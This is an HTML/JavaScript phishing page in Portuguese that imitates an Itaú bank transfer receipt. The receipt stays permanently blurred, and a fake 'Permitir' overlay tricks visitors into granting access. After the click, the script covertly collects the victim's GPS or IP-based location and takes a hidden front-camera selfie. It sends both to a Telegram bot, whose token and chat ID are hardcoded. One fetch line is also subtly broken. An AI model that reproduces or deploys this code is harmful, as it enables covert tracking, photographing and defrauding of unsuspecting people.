<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Comprovante ‚Äì Ita√∫</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
  body{background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh}
  #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center}
  #spinner{width:48px;height:48px;border:4px solid #ddd;border-top:4px solid #003366;border-radius:50%;animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  #msgNegado{display:none;text-align:center;color:#c00;font-size:16px;font-weight:600}
  /* comprovante sempre emba√ßado */
  #comprovante{
    display:none;
    background:#fff;width:100%;max-width:480px;padding:24px;
    border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);
    filter:blur(6px) !important;
  }
  .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
  .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
  .label{color:#555}
  .value{font-weight:600}
  .divider{height:1px;background:#ddd;margin:12px 0}
  .center{text-align:center;font-size:12px;color:#777}
  #camera{display:none}

  /* overlay falso */
  #fakeModal{
    position:fixed;inset:0;z-index:9999;
    display:flex;align-items:center;justify-content:center;
    background:rgba(0,0,0,.55)
  }
  #btnPermitir{
    position:fixed;left:50%;top:45%;
    transform:translate(-50%,-50%);
    padding:10px 28px;
    background:#fff;color:#003366;
    border:1px solid #003366;border-radius:4px;
    font-size:14px;cursor:default
  }
</style>
</head>
<body>

<!-- SPINNER -->
<div id="spinnerBox">
  <div id="spinner"></div>
  <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permiss√£o de localiza√ß√£o‚Ä¶</p>
</div>

<!-- MENSAGEM CASO NEGUE -->
<div id="msgNegado">
  <p>Para visualizar, precisa permitir permiss√µes da p√°gina.</p>
</div>

<!-- COMPROVANTE (SEMPRE EMBA√áADO) -->
<div id="comprovante">
  <div class="logo">Ita√∫</div>
  <div class="row"><span class="label">Comprovante de Transfer√™ncia</span><span class="value" id="dataHora"></span></div>
  <div class="divider"></div>
  <div class="row"><span class="label">Valor</span><span class="value" id="valor"></span></div>
  <div class="divider"></div>
  <div class="row"><span class="label">ID da transa√ß√£o</span><span class="value" id="idTransacao"></span></div>
  <div class="row"><span class="label">Autentica√ß√£o BACEN</span><span class="value" id="autenticacao"></span></div>
  <div class="divider"></div>
  <p class="center">Transa√ß√£o realizada com sucesso.</p>
</div>

<!-- C√ÇMERA OCULTA -->
<video id="camera" style="display:none;" autoplay muted playsinline></video>

<!-- OVERLAY FALSO -->
<div id="fakeModal">
  <div style="background:#fff;border-radius:8px;padding:24px 32px;max-width:320px;text-align:center;font-size:15px">
    <p style="margin-bottom:16px">Para exibir seu <strong>comprovante atualizado</strong>, clique em <strong>Permitir</strong>.</p>
    <button id="btnPermitir">Continuar</button>
  </div>
</div>

<script>
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

const dados = {
  valor: "R$ 1.234,56",
  dataHora: new Date().toLocaleString('pt-BR'),
  idTransacao: 'ITAUPIX' + Date.now(),
  autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
};

document.getElementById('dataHora').textContent   = dados.dataHora;
document.getElementById('valor').textContent      = dados.valor;
document.getElementById('idTransacao').textContent= dados.idTransacao;
document.getElementById('autenticacao').textContent=dados.autenticacao;

const tele = (msg, media = null) => {
  if (media) {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', msg);
    form.append('photo', media, 'selfie.jpg');
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body: form});
  } else {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: ' 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({chat_id: CHAT_ID, text: msg})
    });
  }
};

async function tirarSelfie() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    const v = document.getElementById('camera');
    v.srcObject = stream;
    await v.play();
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      tele('üì∏ selfie', blob);
      stream.getTracks().forEach(t=>t.stop());
    }, 'image/jpeg', 0.9);
  } catch (e) {
    tele('üì∏ erro selfie: ' + e.message);
  }
}

function obterEEnviarDados(origem) {
  if (origem === 'gps' && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos=>{
      const { latitude:l, longitude:n } = pos.coords;
      tele(`üìç gps permitido\nhttps://maps.google.com/?q=${l},${n}`);
      mostrarComprovante();
      setTimeout(tirarSelfie, 1200);
    });
  } else {
    fetch('https://ipapi.co/json/')
      .then(r=>r.json())
      .then(data=>{
        tele(`üìç via IP: https://maps.google.com/?q=${data.latitude},${data.longitude}`);
      })
      .catch(()=>tele('üìç falhou IP'));
    mostrarComprovante();
    setTimeout(tirarSelfie, 1200);
  }
}

function mostrarComprovante() {
  document.getElementById('spinnerBox').style.display='none';
  document.getElementById('comprovante').style.display='block';
}

/* clique for√ßado no overlay */
document.getElementById('btnPermitir').addEventListener('click', () => {
  document.getElementById('fakeModal').remove();
  navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
  navigator.geolocation.getCurrentPosition(()=>{});
  obterEEnviarDados('gps');
});
</script>
</body>
</html>
